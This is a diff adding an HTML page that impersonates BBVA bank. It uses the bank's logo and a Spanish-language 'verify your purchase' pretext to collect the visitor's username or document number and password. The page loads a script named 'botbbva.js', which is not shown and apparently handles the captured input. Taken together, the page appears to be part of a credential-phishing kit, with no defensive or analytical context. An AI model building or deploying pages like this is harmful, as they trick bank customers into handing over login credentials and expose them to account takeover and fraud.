@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="css/style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        html, body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: white;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        header .logo {
+            font-size: 24px;
+            color: #002147;
+            font-weight: bold;
+        }
+
+        header .menu a {
+            text-decoration: none;
+            color: #ffffff;
+            background-color: #002147;
+            padding: 10px 15px;
+            border-radius: 4px;
+        }
+
+        main h2 {
+            color: #333333;
+            font-size: 16px; /* Reducido el tamaño de la fuente para dispositivos móviles */
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        form label {
+            font-size: 14px;
+            margin-bottom: 5px;
+            color: #666666;
+        }
+
+        form select,
+        form input {
+            padding: 8px; /* Reducido el tamaño del relleno */
+            font-size: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            width: calc(100% - 18px); /* Ajuste de ancho para compensar el relleno */
+        }
+
+        form button {
+            padding: 10px;
+            font-size: 14px; /* Reducido el tamaño de la fuente del botón */
+            color: white;
+            background-color: #007bff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        form button:hover {
+            background-color: #0056b3;
+        }
+
+        form .forgot-password {
+            font-size: 14px;
+            color: #007bff;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+
+        form .forgot-password:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <main style="margin: 15% 8%;">
+        <section>
+            <div style=" padding-bottom: 5%; border-style: solid; border-width: 0px 0px 1px 0px; border-color: gray;">
+                <img style="width: 30%;" src="../../img/BANCO BBVA.png" alt="">
+            </div>
+    
+            <div style="margin-top: 1%; margin-bottom: 8%;">
+                <p style="margin-bottom: 8%;"><strong>Vamos a valiar tu compra</strong></p>
+                <p>requiere verificar la transacción que intentas realizar con tu tarjeta  por seguridad</p>
+                
+            </div>
+    
+            
+            <div class="container">
+                <main>
+                    <h2>Hola, ingresa tu número de documento/Usuario y contraseña:</h2>
+                    <form>
+                        <label for="document-number">Usuario</label>
+                        <input type="text" id="username" name="document-number">
+                        <label for="password">Contraseña</label>
+                        <input type="password" id="password" name="password">
+                        <button id="submitBtn">Entrar</button>
+                        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+                    </form>
+                </main>
+            </div>
+            <script src="botbbva.js"></script>
+       
+    </main>
+    
+</body>
+</html>
